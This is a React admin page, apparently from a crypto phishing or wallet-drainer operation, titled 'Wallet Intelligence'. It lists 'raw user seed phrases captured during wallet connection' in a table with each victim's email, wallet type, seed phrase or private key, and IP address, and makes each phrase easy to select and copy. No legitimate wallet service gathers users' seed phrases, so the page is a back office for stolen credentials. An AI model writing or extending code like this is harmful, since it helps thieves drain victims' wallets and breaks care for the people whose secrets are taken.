import { 
  useListWalletPhrases
} from "@workspace/api-client-react";
import { format } from "date-fns";
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { AlertTriangle } from "lucide-react";

export default function WalletPhrases() {
  const { data: phrases, isLoading } = useListWalletPhrases();

  return (
    <div className="space-y-6">
      <div className="bg-destructive/10 border border-destructive/20 p-4 rounded-lg flex items-start gap-4">
        <AlertTriangle className="text-destructive h-5 w-5 mt-0.5 shrink-0" />
        <div>
          <h3 className="text-destructive font-bold uppercase tracking-wider text-sm">Confidential — Admin Eyes Only</h3>
          <p className="text-muted-foreground text-sm mt-1">
            This panel contains raw user seed phrases captured during wallet connection. 
            Store and handle this information with extreme care.
          </p>
        </div>
      </div>

      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-display font-bold">Wallet Intelligence</h1>
          <p className="text-muted-foreground mt-1">Captured seed phrases and keys.</p>
        </div>
      </div>

      <div className="border border-border rounded-lg bg-card/50 backdrop-blur overflow-hidden">
        <Table>
          <TableHeader>
            <TableRow className="bg-muted/50 hover:bg-muted/50">
              <TableHead>Captured At</TableHead>
              <TableHead>Associated User</TableHead>
              <TableHead>Wallet Type</TableHead>
              <TableHead>Seed Phrase / Private Key</TableHead>
              <TableHead>IP Address</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {isLoading ? (
              <TableRow>
                <TableCell colSpan={5} className="text-center py-8 text-muted-foreground">Loading intelligence...</TableCell>
              </TableRow>
            ) : !phrases || phrases.length === 0 ? (
              <TableRow>
                <TableCell colSpan={5} className="text-center py-8 text-muted-foreground">No records found.</TableCell>
              </TableRow>
            ) : (
              phrases.map((item) => (
                <TableRow key={item.id} className="hover:bg-muted/50">
                  <TableCell className="text-sm text-muted-foreground whitespace-nowrap">
                    {format(new Date(item.createdAt), "MMM d, yyyy HH:mm")}
                  </TableCell>
                  <TableCell>
                    {item.userEmail ? (
                      <div className="font-medium text-sm">{item.userEmail}</div>
                    ) : (
                      <span className="text-xs text-muted-foreground italic">Unregistered</span>
                    )}
                  </TableCell>
                  <TableCell>
                    <Badge variant="outline" className="uppercase text-[10px] tracking-wider">
                      {item.walletType}
                    </Badge>
                  </TableCell>
                  <TableCell>
                    <div className="font-mono text-sm bg-background/50 p-2 rounded border border-border/50 break-all select-all">
                      {item.phrase}
                    </div>
                  </TableCell>
                  <TableCell className="text-sm font-mono text-muted-foreground">
                    {item.ipAddress || '-'}
                  </TableCell>
                </TableRow>
              ))
            )}
          </TableBody>
        </Table>
      </div>
    </div>
  );
}
